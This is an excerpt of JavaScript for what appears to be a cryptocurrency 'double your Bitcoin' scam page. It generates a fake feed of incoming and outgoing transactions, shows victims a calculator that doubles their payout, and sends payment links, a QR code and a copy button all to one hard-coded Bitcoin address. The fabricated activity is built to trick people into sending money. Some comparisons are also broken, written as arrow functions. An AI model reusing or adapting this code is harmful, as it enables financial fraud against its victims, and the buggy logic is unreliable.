...
function create_transaction(mins) {
  ...
  row.innerHTML =
    ...
    address +
    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">bc1qj33xf6hzcxpxe5gqvfaxh2a7jf5ay3arxlxz72</span> </td> <td>' +
    amount +
  ...
  row.innerHTML =
    ...
    '</a></td> <td><span class="timer">' +
    mins +
    ' mins ago</span></td> <td><span class="hash-tag text-truncate">bc1qj33xf6hzcxpxe5gqvfaxh2a7jf5ay3arxlxz72</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
    address +
    '</a> </td> <td>' +
    send_amount +
    ' BTC</td> <td><span class="small text-secondary">0<b>.</b>000' +
...
;(get_random = function (
  ...
  $('#gen-btn').click(() => {
    if ($('#cal-in').val() >= 0.05 && $('#cal-in').val() <= 500000) {
      amount_entered = $('#cal-in').val()
      tm = Date.now()
      $('#gen-amount').text(amount_entered)
      $('#qrcode_svg').attr(
        'src',
        'https://api.qrserver.com/v1/create-qr-code/?data=bitcoin%3Abc1qj33xf6hzcxpxe5gqvfaxh2a7jf5ay3arxlxz72%3Famount%3D' +
          amount_entered +
      ...
      $('#paynow')
        ...
        .attr(
          'href',
          'bitcoin:bc1qj33xf6hzcxpxe5gqvfaxh2a7jf5ay3arxlxz72?amount=' +
            amount_entered +
    ...
    } else $('#warn').text('Amount should be within $1500 ')
  }),
  $('#close').click(() => {
  ...
  $('#cal-in').on('input', () => {
    ...
    if (in_amount > 0 && in_amount < 20) {
      $('#cal-out').val(in_amount * 2)
    } else if ((in_amount) => 20 && in_amount <= 100) {
...
$('#cal-out').on('input', () => {
  ...
  if (in_amount > 0 && in_amount < 60) {
    $('#cal-in').val(in_amount / 2)
  } else if ((in_amount) => 60 && in_amount <= 300) {
...
$('#copy_address').click(() => {
  $('#copy_address').attr(
    'data-clipboard-text',
    'bc1qj33xf6hzcxpxe5gqvfaxh2a7jf5ay3arxlxz72',
  )
